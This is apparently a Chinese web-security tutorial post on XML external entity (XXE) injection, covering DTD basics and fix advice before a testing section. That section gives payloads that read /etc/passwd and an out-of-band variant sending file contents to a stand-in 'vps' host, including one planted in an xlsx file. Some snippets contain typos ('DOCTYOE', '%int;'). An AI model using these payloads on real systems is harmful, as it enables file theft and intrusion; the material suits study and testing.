---
author: YOUZAI
title: XML 实体注入
date: 2023/04/25
categories:
 - 常见漏洞
tags:
 - WEB安全
---

## 漏洞原理

当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。

## 漏洞危害

* 读取任意文件。
* 执行系统命令。
* 探测内网端口。
* 攻击内网网站。

## 修复建议

* 使用开发语言提供的禁用外部实体的方法。
* 过滤用户提交的XML数据。

## XML基础

XML 用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML 文档结构包括XML声明、DTD 文档类型定义（可选）、文档元素。

### XML文档的构建模块

所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：
* 元素
  元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。
* 属性
  属性可提供有关元素的额外信息。
* 实体
  实体是用来定义普通文本的变量。实体引用是对实体的引用。
* PCDATA
  PCDATA 的意思是被解析的字符数据（parsed character data）。
  PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。
* CDATA
  CDATA 的意思是字符数据（character data）。  
  CDATA 是不会被解析器解析的文本。

### DTD

DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块，DTD 可以在 XML 文档内声明，也可以外部引用。

### DTD 声明

内部声明：

```xml
<!DOCTYOE test any>
```

完整实例：

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>
<note>
  <to>George</to>
  <from>John</from>
  <heading>Reminder</heading>
  <body>Don't forget the meeting!</body>
</note>
```

外部声明：

```xml
<!DOCTYPE test SYSTEM 'http://www.test.com/evil.dtd'>
```

完整实例：

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>
```

`note.dtd`

```xml
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

## 测试方法

* `PHP`、`JAVA`有回显

==POC==

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE any [<!ENTITY a SYSTEM "file:///etc/passwd">
]>
<root>
	<user>&a;</user>
	<pass>123456</pass>
</root>
```

* `PHP`，`JAVA`无回显

VPS 服务器，`hack.dtd`。

```xml-dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> //php
<!ENTITY % file SYSTEM "file:///etc/passwd"> //java
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://vps/?p=%file;'>">
```

==POC==

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://vps/hack.dtd">
%remote;
%all;
%send;
]>
```

* 将 xlsx 文件后缀名修改成 zip 后，解压，将`[Content_Types].xml`文件里加入 POC

==POC==

```xml
<?xml version="1.0" encoding="utf-8">
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://vps/hack.dtd">
%remote;
%int;
%send;
]>
```